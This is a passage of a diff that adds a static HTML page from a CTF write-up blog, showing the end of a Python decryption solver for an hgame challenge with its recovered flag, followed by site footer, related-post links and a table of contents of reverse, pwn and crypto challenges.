style="color:#ae81ff">32</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">62</span>]]
+xs <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2656224875120172108</span> , <span style="color:#ae81ff">1261711348908201279</span> , <span style="color:#ae81ff">18219282869614004824</span>, <span style="color:#ae81ff">15279054981769814589</span>, <span style="color:#ae81ff">7966355346882200701</span> , <span style="color:#ae81ff">5641592208539483808</span> , <span style="color:#ae81ff">1502927090219059154</span> , <span style="color:#ae81ff">3996223120734273799</span> , <span style="color:#ae81ff">18295033054788808618</span>, <span style="color:#ae81ff">18126228466291248047</span>, <span style="color:#ae81ff">9413762634844369954</span> , <span style="color:#ae81ff">8964324149921197550</span> , <span style="color:#ae81ff">6962485320551449848</span> ]
+
+<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(xs)):
+    y <span style="color:#f92672">=</span> decrypt(xs[i], ks[i])
+    print (n2s(y)<span style="color:#f92672">.</span>decode(), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+<span style="color:#75715e"># hgame{XOr|RoR&amp;rOl|Is+vERY#coMmon*BiTwisE$OPeraTiOn*IT@is%oFten,ENCOUntErED*in.syMMeTRic?encryPtION}</span>
+</code></pre></div><p>据说这个加密方法和求逆多项式还有关系，很神奇</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/reverse/">Reverse</a>
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+            <a href="/tags/crypto/">Crypto</a>
+        
+    </section>
+
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Feb 04, 2022 14:09 CST
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/post/dasctf-2021-09-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTF 2021-09 Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/reversing-kr-writeups/">
+        
+        
+            <div class="article-image">
+                <img src="/post/reversing-kr-writeups/cover.07c1f3179b8f0141d5ce48710bd6353e_hu34624e491264541cebc0dd205ae52fb1_4568716_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Reversing.kr writeups"
+                        
+                        data-hash="md5-B8HzF5uPAUHVzkhxC9Y1Pg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Reversing.kr writeups</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/two-challenges-in-kctf2021-fall/">
+        
+        
+            <div class="article-image">
+                <img src="/post/two-challenges-in-kctf2021-fall/cover.0b0ad36cc36e9ebeffd01954c29b4cf8_hu426b1b4a5db42755d6b1974ac308773d_4005062_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Two Challenges in KCTF2021 Fall"
+                        
+                        data-hash="md5-CwrTbMNunr7/0BlUwptM&#43;A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Two Challenges in KCTF2021 Fall</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/all-solves-during-a-weekend/">
+        
+        
+            <div class="article-image">
+                <img src="/post/all-solves-during-a-weekend/cover.45c645cb247d02096eaa24c4cc16f453_hu9fbd6f3e94fcae560a952561592fc022_254866_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post All Solves During a Weekend"
+                        
+                        data-hash="md5-RcZFyyR9AgluqiTEzBb0Uw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">All Solves During a Weekend</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/dragonctf-runofthemill-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DragonCTF Runofthemill Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 s0uthwood&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#week1">Week1</a>
+      <ul>
+        <li><a href="#reeasyasm">[Re]easyasm</a></li>
+        <li><a href="#recreakme">[Re]creakme</a></li>
+        <li><a href="#reflag-checker">[Re]Flag Checker</a></li>
+        <li><a href="#re猫头鹰是不是猫">[Re]猫头鹰是不是猫</a></li>
+        <li><a href="#pwnenter_the_pwn_land">[Pwn]enter_the_pwn_land</a></li>
+        <li><a href="#pwnenter_the_evil_pwn_land">[Pwn]enter_the_evil_pwn_land</a></li>
+        <li><a href="#pwntest_your_gdb">[Pwn]test_your_gdb</a></li>
+      </ul>
+    </li>
+    <li><a href="#week2">Week2</a>
+      <ul>
+        <li><a href="#rexd-maze">[Re]xD MAZE</a></li>
+        <li><a href="#reupx-magic-0">[Re]upx magic 0</a></li>
+        <li><a href="#reupx-magic-1">[Re]upx magic 1</a></li>
+        <li><a href="#refake-shell">[Re]fake shell</a></li>
+        <li><a href="#recreakme2">[Re]creakme2</a></li>
+        <li><a href="#cryptothe-password-plus-pro-max-ultra">[Crypto]The Password Plus Pro Max Ultra</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
